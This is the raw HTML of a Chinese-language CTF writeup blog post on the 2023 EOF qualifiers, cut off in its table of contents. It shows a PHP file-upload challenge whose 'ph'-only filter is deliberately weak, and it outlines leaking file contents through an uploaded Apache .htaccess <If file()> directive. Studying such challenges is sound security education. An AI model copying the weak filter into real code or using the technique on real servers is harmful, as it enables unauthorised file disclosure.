<!doctype html><html lang=en-us data-theme=dark><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>2023 EOF quals | 蛋餅的競程隨筆</title><link rel=canonical href=https://omeletwithoutegg.github.io/2023/01/13/2023-eof-quals/><meta name=description content="一個廢人想寫題解，所以他想辦法弄網站"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://omeletwithoutegg.github.io/2023/01/13/2023-eof-quals/"><meta property="og:site_name" content="蛋餅的競程隨筆"><meta property="og:title" content="2023 EOF quals"><meta property="og:description" content="2023 EOF CTF 初賽 修了計算機安全，然後期末考似乎是參加 EOF CTF 的初賽，另外還要交 writeup。
把我寫的部份放在我的 blog 上水文章（？）
下一篇文章希望是大二上的修課心得，再不寫就要忘光了。
Web Gist problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <?php if(isset($_FILES['file'])){ $file = $_FILES['file']; if( preg_match('/ph/i', $file['name']) !== 0 || preg_match('/ph/i', file_get_contents($file['tmp_name'])) !== 0 || $file['size'] > 0x100 ){ die(&#34;Bad file!&#34;); } $uploadpath = 'upload/'.md5_file($file['tmp_name']).'/'; @mkdir($uploadpath); move_uploaded_file($file['tmp_name'], $uploadpath.$file['name']); Header(&#34;Location: &#34;.$uploadpath.$file['name']); die(&#34;Upload success!&#34;); } highlight_file(__FILE__); ?> <form method=POST enctype=multipart/form-data> <input type=file name=file> <input type=submit value=Upload> </form> 題目是有一個簡單的 php 網站可以上傳任意檔案，只要檔名和內容不包含 ph 就可以上傳，會被放到 /var/www/html/upload/{somerandomstring}/ 裡面（可以用 /upload/{somerandomstring}/ 去 access 該資料夾）。
首先第一步就是看背後的 HTTP 伺服器是誰，隨便戳個 404 可以得知是 Apache，那就聯想到 .htaccess，去 google 之後得知可以用 <If file(xxx)> 來得知檔案內容。
https://blog.csdn.net/solitudi/article/details/116666720"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-13T00:34:19+08:00"><meta property="article:modified_time" content="2023-01-13T00:34:19+08:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Math"><meta name=twitter:card content="summary"><meta name=twitter:title content="2023 EOF quals"><meta name=twitter:description content="2023 EOF CTF 初賽 修了計算機安全，然後期末考似乎是參加 EOF CTF 的初賽，另外還要交 writeup。
把我寫的部份放在我的 blog 上水文章（？）
下一篇文章希望是大二上的修課心得，再不寫就要忘光了。
Web Gist problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <?php if(isset($_FILES['file'])){ $file = $_FILES['file']; if( preg_match('/ph/i', $file['name']) !== 0 || preg_match('/ph/i', file_get_contents($file['tmp_name'])) !== 0 || $file['size'] > 0x100 ){ die(&#34;Bad file!&#34;); } $uploadpath = 'upload/'.md5_file($file['tmp_name']).'/'; @mkdir($uploadpath); move_uploaded_file($file['tmp_name'], $uploadpath.$file['name']); Header(&#34;Location: &#34;.$uploadpath.$file['name']); die(&#34;Upload success!&#34;); } highlight_file(__FILE__); ?> <form method=POST enctype=multipart/form-data> <input type=file name=file> <input type=submit value=Upload> </form> 題目是有一個簡單的 php 網站可以上傳任意檔案，只要檔名和內容不包含 ph 就可以上傳，會被放到 /var/www/html/upload/{somerandomstring}/ 裡面（可以用 /upload/{somerandomstring}/ 去 access 該資料夾）。
首先第一步就是看背後的 HTTP 伺服器是誰，隨便戳個 404 可以得知是 Apache，那就聯想到 .htaccess，去 google 之後得知可以用 <If file(xxx)> 來得知檔案內容。
https://blog.csdn.net/solitudi/article/details/116666720"><link rel=stylesheet href=https://omeletwithoutegg.github.io/css/styles.c941083b801eaa23a34c2293d2b7af4c20c3f7d479e6e2874d5591e0525972eb9c736e812ae155fd10cf5f2df85b89535adad1e8cb7014f2fab4dbecedecad1e.css integrity="sha512-yUEIO4AeqiOjTCKT0revTCDD99R55uKHTVWR4FJZcuucc26BKuFV/RDPXy34W4lTWtrR6MtwFPL6tNvs7eytHg=="><link rel=stylesheet href=https://omeletwithoutegg.github.io/css/highlight-block.css><link rel=stylesheet href=https://omeletwithoutegg.github.io/css/search.css><link rel=stylesheet href=https://omeletwithoutegg.github.io/css/toggle-switch.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://omeletwithoutegg.github.io/images/favicon.ico><script async src="https://www.googletagmanager.com/gtag/js?id=G-0ME10Z2L0D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-0ME10Z2L0D")}</script></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/posts/>Posts</a></li><li><a href=/resources/>Resources</a></li><li><a href=/search/>Search</a></li><li><a href=/tags/>Tags</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://omeletwithoutegg.github.io/2022/12/24/vbox-ibt/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=https://omeletwithoutegg.github.io/2023/01/15/csie-3rd-sem/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&text=2023%20EOF%20quals" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&is_video=false&description=2023%20EOF%20quals" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=2023%20EOF%20quals&body=Check out this article: https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&name=2023%20EOF%20quals&description=%3ch1%20id%3d%222023-eof-ctf-%e5%88%9d%e8%b3%bd%22%3e2023%20EOF%20CTF%20%e5%88%9d%e8%b3%bd%3c%2fh1%3e%0a%3cp%3e%e4%bf%ae%e4%ba%86%e8%a8%88%e7%ae%97%e6%a9%9f%e5%ae%89%e5%85%a8%ef%bc%8c%e7%84%b6%e5%be%8c%e6%9c%9f%e6%9c%ab%e8%80%83%e4%bc%bc%e4%b9%8e%e6%98%af%e5%8f%83%e5%8a%a0%20EOF%20CTF%20%e7%9a%84%e5%88%9d%e8%b3%bd%ef%bc%8c%e5%8f%a6%e5%a4%96%e9%82%84%e8%a6%81%e4%ba%a4%20writeup%e3%80%82%3cbr%3e%0a%e6%8a%8a%e6%88%91%e5%af%ab%e7%9a%84%e9%83%a8%e4%bb%bd%e6%94%be%e5%9c%a8%e6%88%91%e7%9a%84%20blog%20%e4%b8%8a%e6%b0%b4%e6%96%87%e7%ab%a0%ef%bc%88%ef%bc%9f%ef%bc%89%3cbr%3e%0a%e4%b8%8b%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e5%b8%8c%e6%9c%9b%e6%98%af%e5%a4%a7%e4%ba%8c%e4%b8%8a%e7%9a%84%e4%bf%ae%e8%aa%b2%e5%bf%83%e5%be%97%ef%bc%8c%e5%86%8d%e4%b8%8d%e5%af%ab%e5%b0%b1%e8%a6%81%e5%bf%98%e5%85%89%e4%ba%86%e3%80%82%3c%2fp%3e%0a%3ch2%20id%3d%22web%22%3eWeb%3c%2fh2%3e%0a%3ch3%20id%3d%22gist%22%3eGist%3c%2fh3%3e%0a%3ch4%20id%3d%22problem%22%3eproblem%3c%2fh4%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%201%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%202%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%203%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%204%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%205%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%206%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%207%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%208%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%209%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e10%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e11%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e12%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e13%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e14%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e15%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e16%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e17%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e18%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e19%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e20%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e21%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e22%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e23%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%0a%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%3bwidth%3a100%25%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%20class%3d%22language-php%22%20data-lang%3d%22php%22%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e%26lt%3b%3f%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3ephp%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3eisset%3c%2fspan%3e%28%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bfile%26%2339%3b%3c%2fspan%3e%5d%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24file%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bfile%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3epreg_match%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2fph%2fi%26%2339%3b%3c%2fspan%3e%2c%20%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%21%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%7c%7c%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3epreg_match%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2fph%2fi%26%2339%3b%3c%2fspan%3e%2c%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3efile_get_contents%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%29%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%21%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%7c%7c%3c%2fspan%3e%20%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bsize%26%2339%3b%3c%2fspan%3e%5d%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26gt%3b%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0x100%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%29%7b%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3edie%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bBad%20file%21%26%2334%3b%3c%2fspan%3e%29%3b%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24uploadpath%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3emd5_file%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%29%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3emkdir%3c%2fspan%3e%28%24uploadpath%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3emove_uploaded_file%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%2c%20%24uploadpath%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eHeader%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bLocation%3a%20%26%2334%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24uploadpath%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3edie%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bUpload%20success%21%26%2334%3b%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3ehighlight_file%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%2366d9ef%22%3e__FILE__%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3f%26gt%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%26lt%3bform%20method%3dPOST%20enctype%3dmultipart%2fform-data%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%20%20%26lt%3binput%20type%3dfile%20name%3dfile%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%20%20%26lt%3binput%20type%3dsubmit%20value%3dUpload%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%26lt%3b%2fform%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e%0a%3c%2fdiv%3e%0a%3c%2fdiv%3e%3cp%3e%e9%a1%8c%e7%9b%ae%e6%98%af%e6%9c%89%e4%b8%80%e5%80%8b%e7%b0%a1%e5%96%ae%e7%9a%84%20php%20%e7%b6%b2%e7%ab%99%e5%8f%af%e4%bb%a5%e4%b8%8a%e5%82%b3%e4%bb%bb%e6%84%8f%e6%aa%94%e6%a1%88%ef%bc%8c%e5%8f%aa%e8%a6%81%e6%aa%94%e5%90%8d%e5%92%8c%e5%85%a7%e5%ae%b9%e4%b8%8d%e5%8c%85%e5%90%ab%20%3ccode%3eph%3c%2fcode%3e%20%e5%b0%b1%e5%8f%af%e4%bb%a5%e4%b8%8a%e5%82%b3%ef%bc%8c%e6%9c%83%e8%a2%ab%e6%94%be%e5%88%b0%20%3ccode%3e%2fvar%2fwww%2fhtml%2fupload%2f%7bsomerandomstring%7d%2f%3c%2fcode%3e%20%e8%a3%a1%e9%9d%a2%ef%bc%88%e5%8f%af%e4%bb%a5%e7%94%a8%20%3ccode%3e%2fupload%2f%7bsomerandomstring%7d%2f%3c%2fcode%3e%20%e5%8e%bb%20access%20%e8%a9%b2%e8%b3%87%e6%96%99%e5%a4%be%ef%bc%89%e3%80%82%3cbr%3e%0a%e9%a6%96%e5%85%88%e7%ac%ac%e4%b8%80%e6%ad%a5%e5%b0%b1%e6%98%af%e7%9c%8b%e8%83%8c%e5%be%8c%e7%9a%84%20HTTP%20%e4%bc%ba%e6%9c%8d%e5%99%a8%e6%98%af%e8%aa%b0%ef%bc%8c%e9%9a%a8%e4%be%bf%e6%88%b3%e5%80%8b%20404%20%e5%8f%af%e4%bb%a5%e5%be%97%e7%9f%a5%e6%98%af%20Apache%ef%bc%8c%e9%82%a3%e5%b0%b1%e8%81%af%e6%83%b3%e5%88%b0%20%3ccode%3e.htaccess%3c%2fcode%3e%ef%bc%8c%e5%8e%bb%20google%20%e4%b9%8b%e5%be%8c%e5%be%97%e7%9f%a5%e5%8f%af%e4%bb%a5%e7%94%a8%20%3ccode%3e%26lt%3bIf%20file%28xxx%29%26gt%3b%3c%2fcode%3e%20%e4%be%86%e5%be%97%e7%9f%a5%e6%aa%94%e6%a1%88%e5%85%a7%e5%ae%b9%e3%80%82%3cbr%3e%0a%3ca%20href%3d%22https%3a%2f%2fblog.csdn.net%2fsolitudi%2farticle%2fdetails%2f116666720%22%3ehttps%3a%2f%2fblog.csdn.net%2fsolitudi%2farticle%2fdetails%2f116666720%3c%2fa%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&t=2023%20EOF%20quals" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#gist>Gist</a><ul><li><a href=#problem>problem</a></li></ul></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#how2know_revenge>how2know_revenge</a></li></ul></li><li><a href=#crypto>crypto</a><ul><li><a 